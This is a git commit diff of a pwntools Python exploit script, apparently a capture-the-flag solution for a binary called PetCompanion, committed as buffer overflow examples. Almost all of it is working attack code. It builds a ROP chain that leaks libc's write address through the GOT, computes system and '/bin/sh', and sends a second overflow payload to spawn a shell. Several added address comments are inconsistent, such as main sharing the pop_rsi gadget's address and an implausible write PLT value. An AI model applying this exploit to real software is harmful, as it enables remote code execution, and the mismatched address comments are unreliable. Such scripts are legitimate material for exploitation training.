9ccfd6dc7d71366e9d3cef9ea80421c3a42b99c2
Davi <davi@lenovo.lan>
2024-04-17 17:49:35 -0400

    adding buffer overflow examples

--- PetCompanion.py
+++ PetCompanion.py
@@ -28,37 +28,41 @@ io = elf.process()
 
 # Building ROP Chain
 rop = pwn.ROP(elf)
-pop_rdi = rop.rdi.address
-pop_rsi = rop.rsi.address
+pop_rdi = rop.rdi.address # 0x0000000000400743
+pop_rsi = rop.rsi.address # 0x0000000000400741
 
 # Finding Addresses' Offset from Executable
-write_got_address = elf.got['write']
-write_plt_address = elf.plt['write']
-main_address = elf.symbols['main']
+write_got_address = elf.got['write'] # 0x00600FD8
+write_plt_address = elf.plt['write'] # 0x04195568
+main_address = elf.symbols['main'] # 0x0000000000400741
 
 # Attack #1
 io.recv()
-payload1 = b'A' * offset
-payload1 += pwn.p64(pop_rsi)
-payload1 += pwn.p64(write_got_address)
-payload1 += pwn.p64(0)
-payload1 += pwn.p64(write_plt_address)
-payload1 += pwn.p64(main_address)
+payload1 = b"".join([
+    b"A" * offset,
+    pwn.p64(pop_rsi),
+    pwn.p64(write_got_address),
+    pwn.p64(0),
+    pwn.p64(write_plt_address),
+    pwn.p64(main_address)
+])
 io.sendline(payload1)
 
 # Finding Addresses' Offset from Library
 leaked = io.recvuntil(b'status:').split(b'...\n\n')[1]
 libc = pwn.ELF(library)
-libc_write_address = pwn.u64(leaked[:8])
+libc_write_address = pwn.u64(leaked[:8]) # Randomly assigned at runtime
 libc_base  = libc_write_address - libc.symbols["write"]
 libc_system = libc_base + libc.symbols["system"]
 libc_binsh =  libc_base + next(libc.search(b'/bin/sh\x00'))
 
 # Attack #2
-payload2 = b'A' * offset
-payload2 += pwn.p64(pop_rdi)
-payload2 += pwn.p64(libc_binsh)
-payload2 += pwn.p64(libc_system)
+payload2 = b"".join([
+    b"A" * offset,
+    pwn.p64(pop_rdi),
+    pwn.p64(libc_binsh),
+    pwn.p64(libc_system)
+])
 io.sendline(payload2)
 
 #------------- Getting a Shell ------------#
